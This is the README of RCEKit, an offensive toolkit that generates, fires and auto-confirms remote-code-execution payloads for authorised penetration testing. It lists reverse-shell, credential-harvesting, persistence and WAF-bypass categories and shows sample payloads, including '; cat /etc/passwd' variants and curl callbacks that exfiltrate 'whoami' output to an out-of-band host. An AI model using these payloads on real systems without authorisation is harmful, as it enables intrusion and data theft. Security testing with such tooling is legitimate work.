# RCEKit — RCE Testing Toolkit

**Version 2.10.0** · MIT · Python 3.8+ · no third-party dependencies

RCEKit is an offensive **RCE testing toolkit** for authorised penetration
testing, red teaming, and security research. It covers the full loop, not just
payload generation:

## Demo

RCEKit doesn't just fire payloads — it **confirms execution out-of-band** and
correlates each callback back to the exact payload that caused it. Here it
auto-confirms a blind Log4Shell RCE via an OOB DNS callback:

![RCEKit auto-confirming a blind Log4Shell RCE via an OOB callback, correlating the DNS hit back to the exact payload](confirmation-gifs/oob-confirm.gif)

> **Generate** context-aware, sink-specific payloads → **deliver** them (or export
> to Burp/Nuclei) → **verify** execution automatically against an authorised
> target, including blind and out-of-band callbacks.

## Highlights

- **Targeted generation** — payloads tailored to the **environment** (Unix, Windows, Node.js, Python, PHP, Java, .NET, Ruby, Perl, Go, GraphQL, MongoDB/NoSQL, Docker, Kubernetes), the injection **context** (with container-aware escaping for JSON/XML/YAML/headers/shell-quoted strings), and the specific execution **sink** (OS commands, SSTI, SpEL/OGNL/Groovy, Mongo `$where`, …).
- **Executable-only output** — every payload runs as-is on its channel/sink or carries its own decoder; non-runnable transforms are removed and decoder-required blobs are opt-in, so you never copy a payload that silently does nothing.
- **Sink-aware target profiles** — describe the target once (denied characters, max length, needs-separator, blind, decodes-input) and emit only payloads that could actually fire.
- **Auto-verification** — `--verify-url` fires payloads at an authorised target and reports which executed, using each payload's built-in oracle: a `match` regex, a reflected canary, or a timing delay. Confirmation is **differential**, so `confirmed` means execution and not coincidence: a timing hit must clear a noise-aware margin over a multi-sample baseline *and* reproduce on a re-fire, a reflected canary is re-checked against a paired same-token control so a target that merely echoes input is not mistaken for execution, and a command-output signature already present in the payload-free response is reported `inconclusive` instead of a false positive.
- **Results-based detection** — `--methods reflected` confirms RCE by forcing the target's shell to compute an arithmetic value on **random operands** (`$((a+b))` plus a `$(echo TAG)` substitution collapse) and checking that value appears in the response but not in a payload-free control. A target that merely echoes the payload returns the literal `$((a+b))`, never the sum, so reflection cannot fake a `confirmed`. Confirmed (execution proven) and needs-review (candidate) verdicts are reported as **separate tiers, never merged**.
- **Built-in OOB listener** — `--listen` receives HTTP/DNS callbacks and correlates each back to the exact payload, closing the blind-RCE loop without a separate interactsh/Collaborator.
- **Tooling integrations** — export as context-split Burp wordlists, a ready-to-run ffuf attack (`request.txt` + `run.sh`) when a target profile is given, or runnable Nuclei templates with built-in OOB / time-based / reflection oracles.
- **Safe by default** — a benign `--detection-only` canary mode, safety tiers, a consent gate, and audit logging.

## Install

```bash
git clone https://github.com/kabiri-labs/rcekit.git
cd rcekit        # Python 3.8+, standard library only
```

Generated payload files (`*.txt`, `*.meta.jsonl`, `*.map.jsonl`) and runtime logs
are `.gitignore`d and regenerated on demand.

## Quick Start

```bash
# 1. Benign probes (no consent needed) — check whether your input reaches a sink
python rcekit.py --detection-only --output detect.txt

# 2. Generate targeted payloads for an authorised engagement
python rcekit.py --acknowledge-consent \
  --environments unix --categories basic_enum file_operations waf_bypass \
  --output payloads.txt

# 3. Fire them at an authorised target and auto-confirm what executed
python rcekit.py --acknowledge-consent \
  --environments unix --categories basic_enum file_operations waf_bypass \
  --verify-url "https://target.example/lookup?host=FUZZ"

# 4. Catch blind / out-of-band callbacks and map them back to payloads
python rcekit.py --listen --correlate payloads.txt.map.jsonl
```

Exploitation payloads require `--acknowledge-consent`; `--detection-only` is benign
and does not. Only run any of this against systems you are authorised to test.

If the payload corpus is missing or corrupt (for example quarantined by EDR after
clone), RCEKit refuses to run and exits non-zero instead of silently generating
nothing. Run `python rcekit.py --doctor` to check corpus integrity.

## Options

| Option | Description | Default |
|--------|-------------|---------|
| `-o, --output` | Output file (or base directory for `burp`/`nuclei`) | `rce_payloads.txt` |
| `--environments` | Environments to generate | All |
| `--categories` | Categories to generate | All |
| `--contexts` | Injection contexts to generate | Default (language/structural) set |
| `--encodings` | Encodings to apply | Default (self-contained) set |
| `--output-format` | `text`, `jsonl`, `burp`, `ffuf`, or `nuclei` | `text` |
| `--max-payloads` | Cap the number of payloads (balanced round-robin sample across categories/environments) | Unlimited |
| `--attacker-ip` / `--attacker-domain` | Substituted into reverse-shell / download payloads | `192.168.1.100` / `attacker.com` |
| `--template-file` | Custom JSON/YAML payload templates | `templates/payloads.json` |
| `--doctor` | Check corpus integrity (template found, parses, payload counts) and exit non-zero if missing/empty | Off |
| `--detection-only` | Benign canary/timing probes for safe validation | Off |
| `--include-metadata` | Write a `.meta.jsonl` sidecar (indicators, safety tiers, notes) | Off |
| `--max-safety` | Highest safety tier: `safe`, `intrusive`, `stateful` | `safe` (detection) / `intrusive` |
| `--include-blocking` | Include blocking/timing probes | Off |
| `--acknowledge-consent` | Required to generate/fire exploitation payloads | Off |
| `--watermark` | Embed a traceable token in each payload (audit logging happens regardless) | Off |
| **Out-of-band** | | |
| `--oob-domain` | Collaborator/interactsh domain; each payload gets a unique subdomain token | None |
| `--verify-url` | Authorised target URL with a `FUZZ` marker; fire and confirm execution | None |
| `--verify-data` / `--verify-header` / `--verify-method` | Body (with `FUZZ`) / repeatable header / HTTP method | — |
| `--verify-url-location` / `--verify-body-location` | How to encode the payload at the URL / body injection point | `query_value` / auto |
| `--verify-delay` / `--verify-timeout` | Seconds between requests / per-request timeout | `0` / `8` |
| `--methods <list>` | Run named detection methods against `--verify-url` instead of the classic per-payload oracle (phase 1: `reflected`). Opt-in and additive | None |
| `--verify-active-risk` | Highest safety tier `--verify-url` may fire (`safe`/`intrusive`/`stateful`) | `safe` |
| `--verify-allow-destructive` | Let verification fire destructive payloads (persistence/backdoors); skipped by default | Off |
| `--verify-chain <profile.json>` | Deliver each payload through a multi-step, session-aware flow (login/CSRF → prerequisites → payload delivery → trigger) and confirm in-band or out-of-band | None |
| `--listen` + `--correlate <map.jsonl>` | Run the OOB listener and map callbacks to payloads | Off |
| `--listen-http-port` / `--listen-dns-port` / `--listen-answer-ip` / `--listen-log` | Listener HTTP/DNS ports, DNS answer IP, hit log | `8080` / `5335` / `127.0.0.1` / — |
| **Targeting** | | |
| `--target-profile` | JSON profile of the target (supplies defaults CLI flags override) | None |
| `--deny-chars` / `--max-length` | Drop payloads containing these chars / longer than this | None |
| `--sink-needs-separator` | Sink concatenates input mid shell command → keep only separator-led payloads | Off |
| `--sink-blind` | Sink returns no output → keep only OOB/timing-confirmable payloads | Off |
| `--sink-decodes` | Encodings the sink decodes (e.g. `base64`) → those variants become valid | None |

## Environments, Categories, Contexts, Encodings

<details>
<summary><b>Environments</b></summary>

`unix`, `windows`, `nodejs`, `python`, `php`, `java`, `dotnet`, `ruby`, `perl`,
`go`, `docker`, `kubernetes`, `graphql` (introspection / argument injection /
batching), `mongodb` (operator injection / `$where` / `$function`).
</details>

<details>
<summary><b>Categories</b></summary>

| Category | Purpose |
|----------|---------|
| `basic_enum` | Identity / host / process / OS enumeration |
| `file_operations` | File access and sensitive-file reads |
| `network_operations` | Network configuration and discovery |
| `code_execution` | Language-specific execution, at sink-level granularity |
| `download_execute` | Download-and-run payloads |
| `reverse_shells` | Reverse shells across environments |
| `credential_access` | Credential, token, and secret harvesting |
| `privilege_escalation` | sudo / service / platform priv-esc checks |
| `persistence` | Common persistence tradecraft (lab only) |
| `cloud_metadata` | Cloud instance-metadata harvesting |
| `database_enumeration` | SQL/NoSQL discovery and schema inspection |
| `lateral_movement` | SSH / WinRM / PsExec expansion checks |
| `container_escape` | Docker / Kubernetes hardening checks |
| `waf_bypass` | Quote-free / space-free command injection (`${IFS}`, `{cat,/etc/passwd}`) |
| `oob` | Out-of-band DNS/HTTP callbacks and JNDI/Log4Shell (needs `--oob-domain`) |
| `nosql_injection` | Mongo operator injection, `$where` server-side JS, blind timing |
| `graphql_injection` | GraphQL introspection, resolver-argument injection, batching |
</details>

<details>
<summary><b>Contexts</b> — each carries an escape rule so the payload survives its container</summary>

**Language / structural break-outs** (default set): `raw`, `html`, `attribute`,
`attribute_unquoted`, `javascript`, `sql`, `php`, `unix_shell`, `windows_cmd`,
`powershell`, `shell_single_quoted`, `shell_double_quoted`, `graphql_string`.

**Transport / serialization** (opt-in via `--contexts`; carry *any* environment's
payload and escape it for the wire): `json`, `graphql_variable`, `xml`,
`xml_cdata`, `yaml`, `http_header`.

A payload placed in a `json` string has its quotes/backslashes escaped; in `xml`
it is entity-escaped; in `shell_single_quoted` it breaks out of the quotes — so
it stays valid inside the container and reaches the sink intact.
</details>

<details>
<summary><b>Encodings</b> — default set is always directly usable; blobs are opt-in</summary>

**Default (self-contained):** `none`, `url_encode`, `double_url_encode`,
`random_case` (case-insensitive runners only), and `base64_decode_exec`
(carries its own `base64 -d|sh` decoder; shell runners only).

**Decoder-required (opt-in via `--encodings`):** `base64`, `hex`,
`base64_then_url`, `double_base64`. These are bare blobs that only execute where
the *sink itself* decodes the input; requesting them for text output without
`--include-metadata` prints a warning. Use `--sink-decodes base64` to mark them
valid for a known-decoding sink.

Non-runnable transforms (ROT13, XOR/chunk shuffling, byte splicing) were removed.
</details>

<details>
<summary><b>Code-execution sinks</b> (for <code>--categories code_execution</code>)</summary>

- **nodejs** — `child_process_exec`, `pug_ssti`, `ejs_ssti`, `handlebars_ssti`, `vm_eval`, `deserialization`, `expression_template` (server-side `{{ }}` expression sandbox escape, e.g. n8n)
- **python** — `os_system`, `subprocess`, `jinja2_ssti`, `exec_ast` (function-definition / decorator / default-arg execution in `exec`-of-AST validators, e.g. Langflow)
- **postgres** — `psql_meta_command` (`\!` shell meta-command, including the CR (`\r`) validator bypass, e.g. pgAdmin restore)
- **php** — `exec_system`, `eval`, `deserialize`
- **java** — `runtime_exec`, `freemarker_ssti`, `velocity_ssti`, `thymeleaf_ssti`, `spel`, `ognl`, `groovy`, `deserialization`, `expression`
- **dotnet** — `process_start`, `deserialize`
- **ruby** — `kernel_system`, `erb_ssti`
- **perl** — `system_backticks`
- **go** — `os_exec`
- **mongodb** (`nosql_injection`) — `operator_injection`, `where_js`, `server_side_js`
- **graphql** (`graphql_injection`) — `introspection`, `injection`, `batching`

Payloads are emitted verbatim so each snippet stays syntactically valid for its
sink; encoding variants are applied separately and labelled in metadata.
</details>

## Target Profiles

Describe the target once and generate only what could reach the sink. A profile
is a small JSON file (fields supply defaults; explicit CLI flags override them):

```json
{
  "name": "shell-concat-noquotes",
  "environments": ["unix"],
  "contexts": ["raw"],
  "categories": ["basic_enum", "file_operations", "waf_bypass", "oob"],
  "encodings": ["none"],
  "deny_chars": ["'", "\""],
  "sink_needs_separator": true,
  "oob_domain": "your-id.oast.pro"
}
```

```bash
python rcekit.py --acknowledge-consent --target-profile profiles/shell-concat-noquotes.json
```

- `deny_chars` / `max_length` filter the **final** payload — a URL-encoded quote survives a quote filter because the literal character is gone.
- **Sink shape** narrows generation to what can actually fire: `sink_needs_separator` (mid-command injection → separator-led break-outs only), `sink_blind` (no output → OOB/timing only), `sink_decodes` (input is decoded → those encodings become valid). Against a mid-command sink, `sink_needs_separator` dropped ~20% of payloads *without losing a single confirmed hit*.

A profile may also carry a **`request`** block describing the target request
(URL/path, method, headers, body) with a `FUZZ` marker. The `burp` and `nuclei`
exports then shape their output to the real endpoint instead of a generic
`?rcekit=` parameter:

```json
"request": {
  "url": "/api/v1/lookup",
  "method": "POST",
  "headers": {"Content-Type": "application/json"},
  "body": "{\"host\": \"FUZZ\"}"
}
```

Example profiles ship in [`profiles/`](profiles/) (including `json-api-post.json`).

## Verifying Against a Target

`--verify-url` fires the payloads at an **authorised** target and reports which
executed, using each payload's oracle. Put a `FUZZ` marker where the payload goes
(also works in `--verify-data` and `--verify-header`; method defaults to GET, or
POST with `--verify-data`).

```bash
python rcekit.py --acknowledge-consent \
  --environments unix --categories basic_enum file_operations waf_bypass \
  --verify-url "https://target.example/lookup?host=FUZZ"
```

The payload is encoded for the **injection point it lands in**, so it reaches the
sink intact rather than being blanket URL-encoded. The URL marker is percent-
encoded as a query value (`--verify-url-location url_path`/`raw` to change it),
and the `--verify-data` marker is auto-detected from the `Content-Type`/body
shape: a JSON body is JSON-escaped only (never percent-encoded, which would hand
the sink a literal `%3B%20id`), an `x-www-form-urlencoded` body is form-encoded,
anything else is sent verbatim. Override with `--verify-body-location
json_string|form_value|raw`.

```bash
# JSON body: "; id" is delivered as-is inside the JSON string, not %3B%20id
python rcekit.py --acknowledge-consent --environments unix --categories basic_enum \
  --verify-url "https://target.example/api" --verify-method POST \
  --verify-header "Content-Type: application/json" \
  --verify-data '{"host": "FUZZ"}'
```

```
[verify] sent 270 unique payloads: confirmed=44, no-match=86, no-signature=140

[verify] CONFIRMED execution (44):
  [file_operations/raw] ; cat /etc/passwd            (matched /root:.*?:0:0:/)
  [waf_bypass/raw]      ; cat${IFS}/etc/passwd        (matched /root:.*?:0:0:/)
```

Confirmation is differential to avoid false positives: the timing oracle samples
the baseline several times and requires a candidate delay to both clear a
noise-aware margin and reproduce on a second fire (a one-off slow response is
reported `no-delay`). The timing threshold and per-request timeout adapt to each
payload's own `expected_delay_ms` (parsed from the sleep call, runtime-aware), so
a short sleep that the old flat 2s floor could never confirm now can, and a
request that hangs past the timeout is reported `timing-candidate-on-timeout`
(the hang may be the expected delay) rather than a flat `error`. The reflection
oracle reports `inconclusive` rather
than a false `confirmed` when the match is not proof of execution: a canary hit
is re-checked against a paired **same-token control** (the token in an inert,
non-executing carrier at the same injection point), so a target that merely
echoes input cannot pass as execution, and a command-output signature is checked
against the payload-free baseline response.

### Results-based detection (`--methods reflected`)

The oracles above key off each payload's *own* signature. `--methods reflected`
adds a stronger, results-based proof: instead of a fixed signature it makes the
target's shell **compute a value RCEKit picked at random**, so only execution can
produce it.

```bash
python rcekit.py --acknowledge-consent --environments unix \
  --verify-url "https://target.example/lookup?host=FUZZ" --methods reflected
```

```
[detect] methods: reflected
[detect] sent 6 probes: confirmed=4, negative=2

[detect] CONFIRMED execution (4):
  [reflected/unix/raw] ; echo RKYZRIP$((540141+314681))RKFWVFS$(echo RKBWOOC)RKYZRIP   (target computed 'RKYZRIP854822RKFWVFSRKBWOOCRKYZRIP' ...)
```

Each probe carries two independent proofs: arithmetic on random operands
(`$((a+b))` — the response must contain the *sum*, never the literal expression)
and a `$(echo TAG)` substitution collapse (proof the shell *ran* the
substitution). The computed value is checked with the same encoding-aware search
and payload-free control as the classic oracle, so a target that only echoes
input is reported `negative`, and a value that also appears without the payload is
`inconclusive` — never `confirmed`. Verdicts are split into two tiers,
`confirmed` (execution proven) and `needs-review` (candidate), and never merged.
Unix and Windows (`set /a`) shells are covered; the method is opt-in, so omitting
`--methods` leaves the classic `--verify-url` behaviour unchanged.

**Safe by default.** Verification fires only low-impact proofs (enumeration,
file reads, code-execution and WAF-bypass signatures). Reverse shells,
download-execute, credential access, lateral movement, container escape,
cloud-metadata and OOB payloads are all held back unless you raise the ceiling
with `--verify-active-risk intrusive` (independent of `--max-safety`, which only
governs file output). Before anything is fired, an **execution plan** prints the
request, the number of unique payloads, the safety-tier breakdown, any
high-impact categories, and every network / out-of-band callback destination.

Rate-limit with `--verify-delay` and cap with `--max-payloads`. OOB payloads are
sent but confirmed out-of-band (see below). **Destructive payloads (persistence,
backdoors, security-control tampering) are never fired at the target unless you
pass `--verify-allow-destructive`.** Requires `--acknowledge-consent`; every run
is audited to `exploit_audit.log`.

## Multi-step / Session-aware Verification

A single `--verify-url` request cannot reach sinks that sit behind authentication,
carry the injection in **uploaded file content**, or execute **blind/async**.
`--verify-chain <profile.json>` drives an ordered, cookie-aware request chain
(login → CSRF extraction → prerequisite requests → payload delivery → trigger) and
confirms execution either **in-band** (the payload's `match` oracle against a chosen
step's response) or **out-of-band** (a `{callback}` URL received by the built-in
listener).

Each step is `method` + `path` (+ optional `headers`) with one body of `body`
(raw), `json` (string), `form` (object) or `multipart`
(`{"fields": {...}, "file": {"field","filename","content"}}`). `FUZZ` marks where
the payload lands (including inside uploaded file content); `{var}` is substituted
from earlier steps' `extract` (`{var: regex-with-one-capture-group}`), and `{token}`
is a per-payload unique value (e.g. for a unique upload filename).

```json
{
  "base": "https://target.example",
  "callback_host": "10.0.0.5", "listen_port": 8877,
  "confirm_step": "trigger",
  "steps": [
    {"name": "csrf",  "method": "GET",  "path": "/login", "extract": {"csrf": "csrf_token\" value=\"([^\"]+)"}},
    {"name": "login", "method": "POST", "path": "/login", "form": {"csrf": "{csrf}", "user": "u", "pass": "p"}},
    {"name": "upload","method": "POST", "path": "/import", "multipart": {"file": {"field": "f", "filename": "x_{token}.sql", "content": "FUZZ"}}},
    {"name": "trigger","method": "POST","path": "/import/run", "json": "{\"file\": \"x_{token}.sql\"}"}
  ]
}
```

```bash
python rcekit.py --acknowledge-consent --environments postgres --categories code_execution \
  --contexts raw --encodings none --verify-active-risk intrusive --verify-chain chain.json
```

## Out-of-Band Listener

`--listen` receives OOB callbacks and correlates each to the payload that produced
it, via the token in a `.map.jsonl` manifest — no separate interactsh required.

```bash
# generate OOB payloads (writes oob.txt + oob.txt.map.jsonl), then listen
python rcekit.py --acknowledge-consent --categories oob \
  --oob-domain your-id.oob.example.com --output oob.txt
python rcekit.py --listen --correlate oob.txt.map.jsonl \
  --listen-http-port 8080 --listen-dns-port 53
```

```
[HIT] http token=8k2hn1ufohpv from 10.0.0.5 -> ; curl http://8k2hn1ufohpv.oob.example.com/ [oob/raw]
```

Correlates by token in the callback host **or** path (so exfil like
`curl http://token.dom/$(whoami)` still maps). For real engagements point the OOB
domain's NS/A records here (port 53 needs root); for lab use aim payloads straight
at the listener.

## Output Formats & Integrations

- **`text` / `jsonl`** — payloads (or full JSONL records). A `<output>.map.jsonl` manifest is written for every payload that has an oracle — a correlation `token` or a machine-readable `match` regex — so a callback, reflected canary, or command-output signature is traceable to one payload and auto-confirmable.
- **`burp`** — a `<output>_burp/` directory of deduplicated, watermark-free wordlists split per context (`payloads-<context>.txt`) plus a combined `payloads-all.txt`. Load a list as a Burp Intruder payload set and set the injection point from your captured request. A `request.txt` (with Burp's `§…§` position marker) is written **only** when a `--target-profile` supplies a real request — no generic placeholder is fabricated.
- **`ffuf`** — a `<output>_ffuf/` directory with the same wordlists and, when a `--target-profile` supplies a `request` block, a ready-to-run `request.txt` (with a real `FUZZ` marker) and an executable `run.sh` (`ffuf -request request.txt -w payloads-all.txt -request-proto <scheme>`). Without a request there is nowhere to inject, so only the wordlists are written and a warning is printed.
- **`nuclei`** — a `<output>_nuclei/` directory of runnable templates grouped by environment and oracle: OOB (`interactsh_protocol`), time-based (`duration>=6`), and reflection (canary in body). For the fullest pack, run `--detection-only --output-format nuclei`.

The `burp`/`ffuf` wordlists honour whatever `--encodings` you selected: each distinct final payload is emitted as a literal line, so self-contained variants like `base64_decode_exec` (which Burp/ffuf can't reproduce with a processing rule) are kept. For a raw-only list, generate with `--encodings none`.

## Safety & Ethics

- **Consent gate** — exploitation generation and `--verify-url` require `--acknowledge-consent`; `--detection-only` is benign and does not.
- **Audit log** — every exploitation/verification run is recorded in `exploit_audit.log`. `--watermark` additionally embeds a traceable token in each payload.
- **Safety tiers** — `safe` / `intrusive` / `stateful`, filtered by `--max-safety` (stateful and blocking probes are excluded by default).
- **Logging** — execution logs go to `rcekit.log`.

This toolkit is intended for authorised penetration testing, security research and
education, and defensive training only. **Never use it against systems without
explicit permission** — unauthorized testing is illegal.

## Development

```bash
python -m unittest discover -s tests   # dependency-free test suite
```

Contributions welcome — new sinks/categories, encodings, environments, bug fixes,
and docs. Payload bases live in editable JSON/YAML templates
(`templates/payloads.json`), so most coverage can be extended without touching the
Python source.

## License

MIT — see [LICENSE](LICENSE).
